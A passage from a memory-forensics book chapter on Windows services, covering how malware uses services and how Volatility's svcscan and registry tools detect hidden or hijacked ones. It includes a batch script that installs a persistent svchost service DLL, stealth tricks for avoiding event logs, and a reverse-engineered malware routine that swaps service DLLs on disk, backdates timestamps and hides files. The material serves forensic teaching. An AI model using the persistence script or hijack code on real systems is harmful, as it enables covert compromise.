@@ -1,0 +1,964 @@
+12                      Windows Services
+
+S     ervices on Windows are usually noninteractive (they do not directly accept user
+      input), run consistently in the background, and often run with higher privileges than
+most programs users launch. Examples of services include the event-logging facility, the
+print spooler, the host firewall, and the time daemon. Many antivirus products, including
+Microsoft’s own Windows Defender and Security Center, run as services. Additionally,
+malicious code and adversaries often leverage services for persistence (to survive reboots),
+to load kernel drivers, and to blend in with legitimate components of the system.
+   This chapter introduces you to the internals of Windows services and shows how this
+knowledge can help you investigate compromised systems. It explains the major advan-
+tages to extracting service-related information from RAM rather than relying on only
+data from the registry. To demonstrate the concepts, you’ll examine several scenarios
+involving malware such as Conficker, TDL3, Blazgel, and the tools adversaries use such
+as the Comment Crew (also known as APT1).
+
+Service Architecture
+The diagram in Figure 12-1 shows how the key components of the Windows service
+architecture work together. A list of installed services and their configurations is stored
+in the registry under the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services key.
+Each service has a dedicated subkey with various values that describe how and when the
+service starts; whether the service is for a process, dynamic link library (DLL), or kernel
+driver; and any service-specific settings. In cases where services are implemented as
+DLLs, they will run from a shared host process (svchost.exe).
+
+     Service Instances                                        Multiple shared
+                                                              host processes,         DLL
+                                                             each running one
+                                                             or more service as
+                                                                   a DLL
+                                  Standalone processes                                                        Kernel drivers
+                                                                                    svchost.exe
+                                       spoolsv.exe                                                              tcpip.sys
+      Memory (services.exe)
+
+                               services.exe
+
+                                                 Starts
+                                                               Spooler            TermService              Tcpip
+                                                               Running              Running               Running
+                                 Reads                         Pid 240              Pid 460
+
+                                                                         Linked list of service records
+
+                                                     Keys
+                                                                           Values
+                                               ..........
+     Registry
+
+                                                                       Type: Process
+                                                                    Binary: spoolsv.exe
+                                                 Spooler
+
+                                                                      Type: Shared
+                                Depends       TermService
+                                                                    Binary: termsrv.dll
+
+                                                     Tcpip
+                                                                       Type: Driver
+                                                                     Binary: tcpip.sys
+
+                              HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
+
+     Figure 12-1: Diagram of Windows service components
+
+        The shared host process mechanism is great for performance because many systems
+     run hundreds of DLL-based services concurrently, and there’s no need for each of them
+     to have its own process. However, it can be detrimental to both security and forensic
+     efforts. Only services that run with the same privilege levels should share a host pro-
+     cess; otherwise, one service’s code can access the handles, memory, and other resources
+     created by another service. Similarly, during investigations, if you track activity such as
+     network connections back to a process, and that process is just a container for multiple
+     service DLLs, you still need to figure out what service is initiating the connections (see
+     the “Attributing Connections to Code” section in Chapter 11).
+        As you can see, when the system boots, the Service Control Manager (SCM), which
+     is services.exe, reads from the registry and launches any services configured to auto-
+     matically start. Some services specify dependencies—for example, TermService (RDP)
+
+relies on networking support, so the Tcpip service must successfully start first. As the
+SCM parses these registry entries, it creates a linked-list of service record structures in
+memory that store the service’s current state (stopped, running, paused, and so on) and
+associated process IDs (PIDs). This volatile data is never written to the registry, which
+makes RAM the sole source.
+
+Installing Services
+Before you learn about investigating ex post facto artifacts, it’s important to understand
+how services are created in the first place. This will also enable you to spot such capabili-
+ties when you’re performing static analysis of malware samples. The most common ways
+attackers create services are these:
+
+   • Manual commands: If adversaries already have access to a shell, they can type the
+       sc create and sc start commands to create and start services, respectively. In this
+     case, in addition to the actual service artifacts, you can potentially recover the exact
+     commands by running the consoles or cmdscan Volatility plugins (see Chapter 17).
+   • Batch scripts: Many malware samples drop and execute batch scripts that lever-
+     age the aforementioned commands—just in an automated manner. This technique
+     also results in new disk artifacts. Here is an example of a batch script that creates
+     a service named MyService and configures it to load MyService.dll automatically
+     at boot time inside a shared host process:
+       @echo off
+       set SERVICENAME="MyService"
+       set BINPATH="C:\windows\system32\MyService.dll"
+
+       sc create "%SERVICENAME%" binPath= "%SystemRoot%\system32\svchost.exe \
+           -k %SERVICENAME%" type= share start= auto
+
+       reg add "HKLM\System\CurrentControlSet\Services\%SERVICENAME%\Parameters" \
+           /v ServiceDll /t REG_EXPAND_SZ /d "%BINPATH%" /f
+
+       reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SvcHost" \
+           /v %SERVICENAME% /t REG_MULTI_SZ /d "%SERVICENAME%\0" /f
+
+       sc start %SERVICENAME%
+
+   • Windows APIs: Behind the scenes, the sc commands just call functions such as
+       CreateService and StartService—both of which can be directly imported by mal-
+       ware written in the C or C++ languages. Before CreateService returns, a new
+       subkey is added to the registry with the service’s configuration. StartService
+       leaves traces in the event log as well—to indicate the time when services started.
+
+         • WMI: There are a few high-level interfaces that allow you to interact with services.
+            For example, Windows Management Instrumentation (WMI) exposes a Win32_
+            Service class with Create and Start methods (see http://msdn.microsoft.com/
+            en-us/library/aa394418(v=vs.85).aspx).
+
+     Tricks and Stealth
+     Because installing services is so noisy (that is, it introduces new registry keys and event
+     log entries), attackers have devised several ways to avoid detection by the most common
+     analysis techniques. For example, one of the heuristics that some antivirus products use is
+     watching for processes that call CreateService and StartService sequentially. Of course,
+     these actions aren’t malicious alone, but at least they provide a trigger to antivirus soft-
+     ware to scan the service binary before allowing the service to run. What many analysts
+     don’t know is that neither of the mentioned APIs is actually required to install a service.
+        If you manually create the necessary registry keys (via RegCreateKey, RegSetValue, and so
+     on), there’s no need to use CreateService. You can then start the service by directly calling
+     NdrClientCall2 (an RPC interface called internally by StartService). Alternatively, if the
+     service is for a kernel driver, after the registry keys are created, you can call NtLoadDriver.
+     Both of these methods result in a new running service, but do not generate entries in the
+     event log indicating that a service was created or started. By avoiding the standard APIs,
+     the SCM is bypassed, and thus it doesn’t create service record structures in memory.
+        Although these techniques prevent the creation of an event log and some memory arti-
+     facts, they still require additions to the registry. However, after a service is running, mal-
+     ware can simply delete the registry keys and values. Figure 12-2 shows TDL3 doing exactly
+     that—it bypasses StartService by calling NtLoadDriver and then uses SHDeleteKeyA to
+     remove the evidence in the registry.
+
+     Figure 12-2: TDL3 avoids calling StartService by using NtLoadDriver directly
+
+   At this point, no traces of the service exist in the event log, the registry, or the memory
+of services.exe. You can still find the running process, DLL, or kernel driver in memory
+(unless a rootkit hides them as well), but the valuable metadata that describes how and
+when they were initially loaded won’t be easily accessible. These are just a few of the
+clandestine ways malware can interact with services. Throughout the rest of the chapter,
+you’ll encounter several others, which will give you a comprehensive perspective on
+service-related activities.
+   Also, adversaries don’t just create new services for their own use—they also stop exist-
+ing services to disable or lower security. For example, some variants of Conficker stop the
+following services so that it can operate more freely on the victim computer:
+
+   • Wscsvc (Windows Security Center Service)
+   • Wuauserv (Windows Automatic Update Service)
+   • BITS (Background Intelligent Transfer Service)
+   • WinDefend (Windows Defender Service)
+   • WerSvc (Windows Error Reporting Service)
+  You can stop a service in several ways. Two such methods include the use of the
+ControlService API function and dropping a batch file that contains commands like
+net stop SERVICENAME. Malware can also just use TerminateProcess, but that does not
+allow the service process to shut down cleanly or notify the SCM of the service’s new
+status, which can often lead to stability problems. Thus, when you’re reviewing services
+on a suspect system, remember that stopped services can often be indicators as well as
+started/running services.
+
+Investigating Service Activity
+Windows ships with several tools you can use to investigate services on a live
+machine. Be aware, however, that they’re all subject to monitoring or manipulation
+by rootkits active on the system. Nonetheless, it is good to know your options in
+case you want to compare what you see on a live system with the data in RAM. For
+example, you can use the Microsoft Management Console (MMC) to investigate or
+control the services on a system. To bring it up, go to Start ➪ Run and then type
+services.msc and press Enter.
+   From a command line, or if you need to enumerate services automatically with a
+collection script, you have a few options available. The first one that comes to mind is
+
+     the Get-Service PowerShell command. You can use this functionality in the following
+     manner:
+       PS C:\Users\Jake> Get-Service
+
+       Status    Name               DisplayName
+       ------    ----               -----------
+       Stopped   AdobeARMservice    Adobe Acrobat Update Service
+       Running   AeLookupSvc        Application Experience
+       Stopped   ALG                Application Layer Gateway Service
+       Stopped   AppIDSvc           Application Identity
+       Running   Appinfo            Application Information
+       Stopped   AppMgmt            Application Management
+       Stopped   aspnet_state       ASP.NET State Service
+       Running   AudioEndpointBu... Windows Audio Endpoint Builder
+       Running   Audiosrv           Windows Audio
+       Stopped   AxInstSV           ActiveX Installer (AxInstSV)
+       Stopped   BDESVC             BitLocker Drive Encryption Service
+       Running   BFE                Base Filtering Engine
+       [snip]
+
+        Another option that you can access from a standard command shell (that is, not
+     PowerShell) is the sc query command. The following list shows the installed services
+     along with their types and current states:
+       C:\Users\Jake> sc query
+
+       SERVICE_NAME: Appinfo
+       DISPLAY_NAME: Application Information
+               TYPE               : 20 WIN32_SHARE_PROCESS
+               STATE              : 4 RUNNING
+                                        (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+               WIN32_EXIT_CODE    : 0 (0x0)
+               SERVICE_EXIT_CODE : 0 (0x0)
+               CHECKPOINT         : 0x0
+               WAIT_HINT          : 0x0
+
+       SERVICE_NAME: AudioEndpointBuilder
+       DISPLAY_NAME: Windows Audio Endpoint Builder
+               TYPE               : 20 WIN32_SHARE_PROCESS
+               STATE              : 4 RUNNING
+                                        (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+               WIN32_EXIT_CODE    : 0 (0x0)
+               SERVICE_EXIT_CODE : 0 (0x0)
+               CHECKPOINT         : 0x0
+               WAIT_HINT          : 0x0
+       [snip]
+
+ NOTE
+ You can also consider the Sysinternals PsService utility (http://technet.microsoft.com/
+ en-us/sysinternals/bb897542.aspx), which also enables you to enumerate services of
+ remote systems.
+
+   Although these tools can give you a brief look at service-related activity, they often lack
+the detail required to perform in-depth investigations. For full-scale analysis, you really
+need to consult RAM as well as data in the registry. If you have a forensic disk image of a
+suspect machine, you can recover the system registry hive (C:\Windows\system32\config\
+system) and parse it with a tool such as RegRipper or RegDecoder. However, remember
+that a large portion of the registry is memory-resident (see Chapter 10), so access to a
+memory dump is often all you need to accomplish the upcoming analysis objectives.
+
+Analysis Objectives
+
+Your objectives are these:
+
+   • Determine recently created services: By leveraging the last modified timestamps
+     on a service’s registry key, you can potentially determine the timeframe when it
+     was added to the system. However, post-installation configuration changes (such
+     as the start type, dependencies, or description) will overwrite this value and mask
+     the create time.
+   • Detect services in invalid states: You can detect when unauthorized services are
+     running (for example, RDP or Telnet) or when security services have been unex-
+     pectedly halted. By performing routine checks of live systems, you can also detect
+     any changes in service state between time periods.
+   • Identify hijacked services: In many cases, malware avoids creating a new service.
+     Instead, it selects an existing service and overwrites the path to the service’s binary
+     in the registry—pointing it at a malicious file. Alternatively, malware can patch or
+     replace the service binary on disk (assuming that it has permission).
+   • Locate hidden (unlinked) service records: The Blazgel rootkit was the first mal-
+     ware specimen we encountered (but certainly not the last) that hid from the SCM by
+     manipulating the in-memory list of service record structures. As you will see in an
+     upcoming example, it’s possible to detect this using the svcscan Volatility plugin.
+
+     Data Structures
+﻿
+
+     As previously mentioned, the SCM maintains a linked-list of structures that contain infor-
+     mation about installed services. The structures contain a member at a fixed offset with a
+     constant value of sErv or serH (depending on the OS version), which makes them easy
+     to find. However, Microsoft does not document these structures, so we had to assign
+     our own names for the structures and their members. Here is how they appear for 64-bit
+     Windows 7 systems:
+       >>> dt("_SERVICE_HEADER")
+       '_SERVICE_HEADER' (None bytes)
+       0x0   : Tag               ['array', 4, ['unsigned char']]
+       0x10 : ServiceRecord      ['pointer', ['_SERVICE_RECORD']]
+
+       >>> dt("_SERVICE_RECORD")
+       '_SERVICE_RECORD'
+       0x0   : PrevEntry         ['pointer', ['_SERVICE_RECORD']]
+       0x8   : ServiceName       ['pointer', ['String', {'length': 512,
+       'encoding': 'utf16'}]]
+       0x10 : DisplayName        ['pointer', ['String', {'length': 512,
+       'encoding': 'utf16'}]]
+       0x18 : Order              ['unsigned int']
+       0x20 : Tag                ['array', 4, ['unsigned char']]
+       0x28 : DriverName         ['pointer', ['String', {'length': 256,
+       'encoding': 'utf16'}]]
+       0x28 : ServiceProcess     ['pointer', ['_SERVICE_PROCESS']]
+       0x30 : Type               ['Flags', {'bitmap': svc_types}]
+       0x34 : State              ['Enumeration', {'target': 'long',
+       'choices': svc_states}]
+
+       >>> dt("_SERVICE_PROCESS")
+       '_SERVICE_PROCESS'
+       0x10 : BinaryPath ['pointer', ['String', {'length': 256, 'encoding': 'utf16'}]]
+       0x18 : ProcessId ['unsigned int']
+
+      NOTE
+      The _SERVICE_RECORD structures on older versions of Windows such as XP and 2003
+      included a ServiceList (doubly linked list) instead of a PrevEntry (singly linked list).
+      Regardless of how they’re linked, a service’s position in the list is indicative of when
+      the SCM read its configuration from the registry (which is typically alphabetical), not
+      the order that the services started. One exception is services created after a system
+      boots—in which case the new service is appended to the end of the list, and it will
+      have the highest order regardless of its name. This is useful because you can easily
+      distinguish newly installed services from preexisting ones.
+
+Key Points
+The key points for _SERVICE_HEADER are these:
+
+   • Tag: This member contains the fixed value of sErv or serH that identifies service
+      record headers.
+   • ServiceRecord: A pointer to the first service record structure that the header
+      contains.
+
+The key points for _SERVICE_RECORD are these:
+
+   • PrevEntry: This singly linked list connects a service structure to the previous one.
+   • ServiceName: This member points to a Unicode string that contains the service
+     name (such as spooler or SharedAccess).
+   • DisplayName: A more descriptive name for the service—for example, the Smb ser-
+     vice’s display name is Message-oriented TCP/IP and TCP/IPv6 Protocol(SMB
+     session).
+   • FullServicePath : This member can have different meanings depending on
+     the type of service. If the service is for a file system driver or kernel driver, the
+     FullServicePath member points to a Unicode string containing the name of the
+     driver object (for example, \Driver\Tcpip ). If the service is for a process, the
+     FullServicePath member points to a _SERVICE_PATH structure that contains the full
+     path on disk to the executable file and its current process ID if the service is running.
+   • ServiceType: This member identifies the service type.
+   • CurrentState: This member identifies the service’s current state.
+ NOTE
+ The Microsoft Developer Network (MSDN) website details the full list of possible
+ types and states here: http://msdn.microsoft.com/en-us/library/windows/desktop/
+ ms685996(v=vs.85).aspx. You can also find them in the WinNt.h and WinSvc.h header
+ files from the Windows Software Development Kit (SDK).
+
+Scanning Memory
+There are a few ways to enumerate services by parsing process memory. A program-
+mer named EiNSTeiN_ wrote a tool called Hidden Service Detector (hsd), which runs
+on live Windows systems. It works by scanning the memory of services.exe for
+PServiceRecordListHead—a symbol that points to the beginning of the doubly-linked list
+
+     of _SERVICE_RECORD structures on XP and 2003 systems. In particular, hsd scans services
+     .exe for the pattern of bytes that make up the following instructions:
+
+       // WinXP, Win2k3
+       56 8B 35 xx xx xx xx = MOV ESI, DWORD PTR DS:[PServiceRecordListHead]
+
+       // Win2k
+       8B 0D xx xx xx xx = MOV ECX, DWORD PTR DS:[PServiceRecordListHead]
+
+        In the code, the xx bytes indicate wildcards. After hsd finds the list head signature, it
+     enumerates all service records by walking the list. This is an interesting method, but like
+     other linked lists, malware can unlink entries to hide running services. Furthermore,
+     the PServiceRecordListHead symbol was removed after Windows 2003, so the technique
+     applies only to older systems.
+
+     Volatility’s SvcScan Plugin
+     Due to weaknesses in the aforementioned memory scanning technique and the portability
+     concerns, the svcscan Volatility plugin works a little bit differently. It still leverages
+     the linked list, but it also performs a brute force scan through all memory owned by
+     services.exe looking for the sErv or serH tags. Because these tags are embedded in mem-
+     bers of each _SERVICE_RECORD, you can find all instances of the structures even if they’ve
+     been unlinked from the list. In fact, you can then compare the entries found by scanning
+     with the ones found via list walking and determine exactly what services (if any) have
+     been maliciously unlinked—something discussed in more detail later in the chapter.
+        For now, just to get you familiar with the plugin’s output format, here is an example
+     from a clean Windows system:
+       $ python vol.py –f memory.dmp --profile=Win7SP0x64 svcscan --verbose
+       Volatility Foundation Volatility Framework 2.4
+
+       Offset: 0x992c30
+       Order: 34
+       Process ID: 892
+       Service Name: BITS
+       Display Name: Background Intelligent Transfer Service
+       Service Type: SERVICE_WIN32_SHARE_PROCESS
+       Service State: SERVICE_RUNNING
+       Binary Path: C:\Windows\system32\svchost.exe -k netsvcs
+       ServiceDll: %SystemRoot%\System32\qmgr.dll
+
+       Offset: 0x993950
+       Order: 48
+       Process ID: 892
+       Service Name: CertPropSvc
+       Display Name: Certificate Propagation
+
+  Service Type: SERVICE_WIN32_SHARE_PROCESS
+  Service State: SERVICE_RUNNING
+  Binary Path: C:\Windows\system32\svchost.exe -k netsvcs
+  ServiceDll: %SystemRoot%\System32\certprop.dll
+
+  Offset: 0x9ac930
+  Order: 367
+  Process ID: 1240
+  Service Name: WSearch
+  Display Name: Windows Search
+  Service Type: SERVICE_WIN32_OWN_PROCESS
+  Service State: SERVICE_RUNNING
+  Binary Path: C:\Windows\system32\SearchIndexer.exe /Embedding
+
+  Offset: 0x9a4260
+  Order: 320
+  Process ID: -
+  Service Name: usbuhci
+  Display Name: Microsoft USB Universal Host Controller Miniport Driver
+  Service Type: SERVICE_KERNEL_DRIVER
+  Service State: SERVICE_STOPPED
+  Binary Path: -
+
+  Offset: 0x981980
+  Order: 8
+  Process ID: -
+  Service Name: AFD
+  Display Name: Ancillary Function Driver for Winsock
+  Service Type: SERVICE_KERNEL_DRIVER
+  Service State: SERVICE_RUNNING
+  Binary Path: \Driver\AFD
+
+  [snip]
+
+   The output shows that the first two services (BITS and CertPropSvc) are both imple-
+mented as DLLs (qmgr.dll and certprop.dll, respectively), and that they are running
+within the same host process (PID 892). The WSearch service is a dedicated process
+(SearchIndexer.exe) and is running as PID 1240. The last two services (usbuhci and AFD)
+are both for kernel drivers, but only one of them is running. Because usbuhci is currently
+stopped, its binary path is unspecified—meaning no driver is loaded for that service. On
+the other hand, AFD is running, so its binary path (\Driver\AFD) is accessible.
+
+Recently Created Services
+A service’s registry key is updated with a last write timestamp when the service is created
+and subsequently when it is modified for any reason. If you suspect malware recently
+used services, but don’t know the exact service name(s), one step you can take is to sort
+
+     them all by timestamps and then view the latest ones. The following example analyzes
+     Stuxnet, which evades the SCM by using the NtLoadDriver trick discussed previously. As
+     a result, the svcscan plugin won’t detect its services, but you’ll still be able to analyze the
+     registry keys. To do this in your own investigations, enter the volshell plugin:
+       $ python vol.py -f stuxnet.vmem --profile=WinXPSP3x86 volshell
+       Volatility Foundation Volatility Framework 2.4
+       Current context: process System, pid=4, ppid=0 DTB=0x319000
+       Welcome to volshell!
+       To get help, type 'hh()'
+       >>>
+
+       Now you can import the registry API module, as discussed in Chapter 10:
+       >>> import volatility.plugins.registry.registryapi as registryapi
+       >>> regapi = registryapi.RegistryApi(self._config)
+
+       The following lines read all subkeys under the designated ControlSet001\Services
+     key in the system hive:
+       >>> key = "ControlSet001\Services"
+       >>> subkeys = regapi.reg_get_all_subkeys("system", key)
+
+        Before you can sort by timestamp, build a dictionary of services with service names
+     as the keys and integer times as the values. Then sort the unique timestamps in reverse
+     order (so the most recent ones appear at the front of the list):
+       >>> services = dict((s.Name, int(s.LastWriteTime)) for s in subkeys)
+       >>> times = sorted(set(services.values()), reverse=True)
+
+       Isolate the most recent three timestamps, and then loop through the dictionary you
+     previously created, printing the name of the services that match your times:
+       >>> top_three = times[0:3]
+       >>> for time in top_three:
+       ...   for name, ts in services.items():
+       ...     if ts == time:
+       ...       print time, name
+       ...
+       1307075207 MRxCls
+       1307075207 MRxNet
+       1307075158 PROCMON20
+       1288372308 DMusic
+       1288372308 splitter
+       1288372308 kmixer
+       1288372308 drmkaud
+       1288372308 sysaudio
+       1288372308 swmidi
+       1288372308 wdmaud
+       1288372308 aec
+
+   The output shows eleven services printed in three unique timeframes. The most recent
+timeframe (1307075207) translates to 2011-06-03 04:26:47 UTC. At this time, the MRxCls and
+MRxNet services were either created or modified. It should be immediately suspicious that
+neither of these services is visible in the output of svcscan. This is a strong indicator that
+the two services are hidden (or they were started inappropriately); otherwise, the SCM
+would know about them:
+  $ python vol.py -f stuxnet.vmem --profile=WinXPSP3x86 svcscan
+        | egrep -i '(mrxnet|mrxcls)'
+  Volatility Foundation Volatility Framework 2.4
+  $
+
+   One way to verify whether the services are actually running, despite the fact that
+there are no _SERVICE_RECORD structures, involves first determining the associated kernel
+module. The path is stored in the ImagePath value of the corresponding registry key. As
+you can see in the following output, the module is mrxnet.sys:
+  $ python vol.py -f stuxnet.vmem --profile=WinXPSP3x86 printkey
+  -K 'ControlSet001\Services\MRxNet'
+  Volatility Foundation Volatility Framework 2.4
+  Legend: (S) = Stable   (V) = Volatile
+
+  ----------------------------
+  Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
+  Key name: MRxNet (S)
+  Last updated: 2011-06-03 04:26:47 UTC+0000
+
+  Subkeys:
+    (V) Enum
+
+  Values:
+  REG_SZ          Description       : (S) MRXNET
+  REG_SZ          DisplayName       : (S) MRXNET
+  REG_DWORD       ErrorControl      : (S) 0
+  REG_SZ          Group             : (S) Network
+  REG_SZ          ImagePath         : (S) \??\C:\WINDOWS\system32\Drivers\mrxnet.sys
+  REG_DWORD       Start             : (S) 1
+  REG_DWORD       Type              : (S) 1
+
+  You can cross-reference that module name with the currently loaded kernel modules:
+  $ python vol.py -f stuxnet.vmem --profile=WinXPSP3x86 modules
+        | grep mrxnet.sys
+  Volatility Foundation Volatility Framework 2.4
+  0x81c2a530 mrxnet.sys           0xb21d8000     0x3000
+  \??\C:\WINDOWS\system32\Drivers\mrxnet.sys
+
+       The suspect module is in fact loaded, which means that the MRxNet service is running.
+     At this point, you’ve leveraged timestamps in the registry to figure out what service(s)
+     were most recently created or modified, and from there determined that two of them
+     were hidden from the SCM.
+
+     Detecting Hijacked Services
+     If attackers simply want to use services as a means of persistence, it often doesn’t make
+     sense to create an entirely new one. For example, so many services on a typical machine
+     are disabled or unused, so why not just repurpose (that is, hijack) an existing one? Many
+     threat groups take this approach. If you base your analysis solely on looking for nonstan-
+     dard or unrecognized service names, you’ll overlook these types of attacks. There are
+     two variations of hijacking existing services, both described next.
+
+     Registry-based Hijacks
+     This method, used by the Comment Crew (also known as APT1), involves simply chang-
+     ing the ImagePath or ServiceDll registry value of a legitimate service so that it points
+     at a malicious file. For example, the WEBC2-ADSPACE sample (http://contagiodump
+     .blogspot.com/2013/03/mandiant-apt1-samples-categorized-by.html) hijacked the ERSvc
+     service (Error Reporting Service) by modifying its DLL path from %SystemRoot%\system32\
+     ersvc.dll to %SystemRoot%\system\ersvc.dll.
+        Here’s an example of how Volatility’s output appears on an infected system:
+       $ python vol.py –f memory.dmp --profile=Win7SP0x64 svcscan --verbose
+       Volatility Foundation Volatility Framework 2.4
+
+       [snip]
+
+       Offset: 0x992c30
+       Order: 34
+       Process ID: 892
+       Service Name: ERSvc
+       Display Name: Error Reporting Service
+       Service Type: SERVICE_WIN32_SHARE_PROCESS
+       Service State: SERVICE_RUNNING
+       Binary Path: C:\Windows\system32\svchost.exe -k netsvcs
+       ServiceDll: %SystemRoot%\system\ersvc.dll
+
+        Sometimes Microsoft changes the name of a legitimate service DLL between operating
+     system versions. For example, on Windows XP, the Dynamic Configuration Host Protocol
+     (DCHP) service binary is dhcpsvc.dll; in Windows 7, it is dhcpcore.dll. Thus, keeping
+     track of the changes is a cumbersome task. Instead, you can use the following script to
+
+build a whitelist of known good paths for service binaries by exporting the information
+from a clean system.
+    1 import pywintypes, win32api, win32con
+    2
+    3 def main():
+    4
+    5     read_perm = (win32con.KEY_READ |
+    6                   win32con.KEY_ENUMERATE_SUB_KEYS |
+    7                   win32con.KEY_QUERY_VALUE)
+    8
+    9     hkey = win32api.RegOpenKeyEx(
+   10                       win32con.HKEY_LOCAL_MACHINE,
+   11                       "SYSTEM\\ControlSet001\\Services",
+   12                       0,
+   13                       read_perm)
+   14
+   15     names = [data[0] for data in win32api.RegEnumKeyEx(hkey)]
+   16
+   17     for name in names:
+   18
+   19         try:
+   20              subkey = win32api.RegOpenKeyEx(
+   21                           hkey,
+   22                           "%s\\Parameters" % name,
+   23                           0,
+   24                           read_perm)
+   25
+   26              value = win32api.RegQueryValueEx(
+   27                           subkey,
+   28                           "ServiceDll")
+   29
+   30         except pywintypes.error:
+   31              continue
+   32
+   33         path = win32api.ExpandEnvironmentStrings(value[0])
+   34         name = name.lower()
+   35         path = path.lower()
+   36
+   37         print name, "=", path
+   38
+   39 if __name__ == '__main__':
+   40     main()
+
+   The code requires Python Extensions for Windows (http://sourceforge.net/
+projects/pywin32/) to run, and it outputs data in an INI format. However, you can adjust
+the output in a format of your choosing to help automatically produce alerts within
+Volatility plugin results.
+
+     Disk-based Hijacks
+     The second variation of hijacking services involves replacing the service binary on disk.
+     In this case, the registry’s ServiceDll still points at the same path, but the file content has
+     changed. This typically takes place in the following steps:
+
+       1.   Query the registry to get the path to the target service’s binary file.
+       2.   Move or delete the original file.
+       3.   Create a new file at the same path as the original.
+       4.   Restart the service (or just wait until a reboot).
+
+        The next code listing (which was reverse-engineered from a malware sample) shows
+     the exact, detailed approach taken by a particular threat group.
+          1 int __stdcall WinMain(HINSTANCE hInstance,
+          2                         HINSTANCE hPrevInstance,
+          3                         LPSTR lpCmdLine,
+          4                         int nShowCmd)
+          5 {
+          6
+          7   /* Local variable declarations are suppressed for brevity */
+          8
+          9   strcpy((char *)&szInfectSignature, "XXXXX");
+         10
+         11   if ( !RegOpenKeyExA(
+         12            HKEY_LOCAL_MACHINE,
+         13            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
+         14            0,
+         15            KEY_ALL_ACCESS,
+         16            &hKey) )
+         17   {
+         18     cbData = 2048;
+         19     RegQueryValueExA(hKey, "netsvcs", 0, &Type, &Data, &cbData);
+         20
+         21     Str = (char *)&Data;
+         22     if ( Data )
+         23     {
+         24       do
+         25       {
+         26          wsprintfA(&SubKey,
+         27                     "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters",
+         28                     Str);
+         29          if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+         30                              &SubKey,
+         31                              0,
+         32                              KEY_QUERY_VALUE,
+         33                              &phkResult) )
+         34          {
+
+35     RegCloseKey(phkResult);
+36   }
+37   else
+38   {
+39     memset(&FileName, 0, MAX_PATH);
+40     dwStatus = (LPCVOID)RegQueryValueExA(phkResult,
+41                                          "ServiceDll",
+42                                          0, 0,
+43                                          (LPBYTE)&FileName,
+44                                          &cbData);
+45
+46     memset((void *)&Buffer, 0, MAX_PATH);
+47     strcpy((char *)&Buffer, &FileName);
+48     ExpandEnvironmentStringsA(&Buffer, &FileName, MAX_PATH);
+49
+50     if ( dwStatus == STATUS_SUCCESS )
+51     {
+52       NumberOfBytesRead = 0;
+53       memset((void *)&Buffer, 0, MAX_PATH);
+54
+55       GetTempPathA(MAX_PATH, (LPSTR)&Buffer);
+56
+57       wsprintfA(&NewDllFile,
+58                 "%s\\~DF%d.tmp",
+59                 &Buffer,
+60                 GetTickCount());
+61
+62       wsprintfA(&OrigFileCopy,
+63                 "%s\\~MS%d.txt",
+64                 &Buffer,
+65                 GetTickCount());
+66
+67       hFileOriginal = CreateFileA(&FileName,
+68                                   GENERIC_READ,
+69                                   FILE_SHARE_READ,
+70                                   0,
+71                                   OPEN_EXISTING,
+72                                   0, 0);
+73
+74       if ( hFileOriginal != INVALID_HANDLE_VALUE )
+75       {
+76         memset(String, 0, 0x400u);
+77         String[1024] = 0;
+78
+79         SetFilePointer(hFileOriginal, -1024, 0, FILE_END);
+80         ReadFile(hFileOriginal,
+81                  String,
+82                  0x400u,
+83                  &NumberOfBytesRead,
+84                  0);
+
+        85              CloseHandle(hFileOriginal);
+        86
+        87              ptrSigIndex = FindSubstring(String,
+        88                                    (const char *)&szInfectSignature,
+        89                                    1024, 0);
+        90
+        91              if ( ptrSigIndex != -1 )
+        92              {
+        93                lpBuffer = &String[ptrSigIndex];
+        94
+        95                MoveFileA(&FileName, &OrigFileCopy);
+        96                MoveFileExA(&OrigFileCopy, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
+        97
+        98                hResInfo = FindResourceA(hInstance, (LPCSTR)101, "BIN");
+        99                if ( hResInfo )
+       100                {
+       101                  hResData = LoadResource(hInstance, hResInfo);
+       102                  if ( hResData )
+       103                  {
+       104                    hFile = CreateFileA(
+       105                              &NewDllFile,
+       106                              GENERIC_WRITE,
+       107                              FILE_SHARE_WRITE,
+       108                              0,
+       109                              CREATE_ALWAYS,
+       110                              FILE_ATTRIBUTE_NORMAL,
+       111                              0);
+       112                    if ( hFile )
+       113                    {
+       114                      SystemTime.wMonth = 2;
+       115                      SystemTime.wDayOfWeek = 0;
+       116                      SystemTime.wMinute = 2;
+       117                      SystemTime.wSecond = 0;
+       118                      SystemTime.wYear = 2005;
+       119                      SystemTime.wDay = 18;
+       120                      SystemTime.wHour = 20;
+       121
+       122                      SystemTimeToFileTime(&SystemTime, &FileTime);
+       123                      LocalFileTimeToFileTime(&FileTime, &CreationTime);
+       124                      SetFileTime(hFile, &CreationTime, 0, &CreationTime);
+       125
+       126                      dwResSize = SizeofResource(0, hResInfo);
+       127                      WriteFile(hFile,
+       128                                hResData,
+       129                                dwResSize,
+       130                                &NumberOfBytesWritten,
+       131                                0);
+       132
+       133                      lpBuffer[5] = 75;
+       134                      if ( lpBuffer )
+
+135                       {
+136                         nNumberOfBytesToWrite = lstrlenA(lpBuffer);
+137                         WriteFile(hFile,
+138                                   lpBuffer,
+139                                   nNumberOfBytesToWrite + 1,
+140                                   &NumberOfBytesWritten,
+141                                   0);
+142                       }
+143                       CloseHandle(hFile);
+144                       FreeResource(hResData);
+145
+146                       MoveFileA(&NewDllFile, &FileName);
+147                       SetFileAttributesA(&FileName, FILE_ATTRIBUTE_HIDDEN);
+148
+149                       DeleteFileA(&NewDllFile);
+150                       DeleteFileA(&OrigFileCopy);
+151                     }
+152                   }
+153                 }
+154               }
+155             }
+156           }
+157         }
+158         szNullChar = strchr(Str, 0);
+159         szNextString = szNullChar[1];
+160         Str = szNullChar + 1;
+161       }
+162       while ( szNextString );
+163     }
+164     DeleteFileA(&Filename);
+165   }
+166   return 0;
+167 }
+
+The following list describes how the code works:
+
+• Line 9: Copies XXXXX (redacted) into the szInfectSignature variable. This is later
+  used as an infection marker, so the malware doesn’t replace the same file more
+  than once.
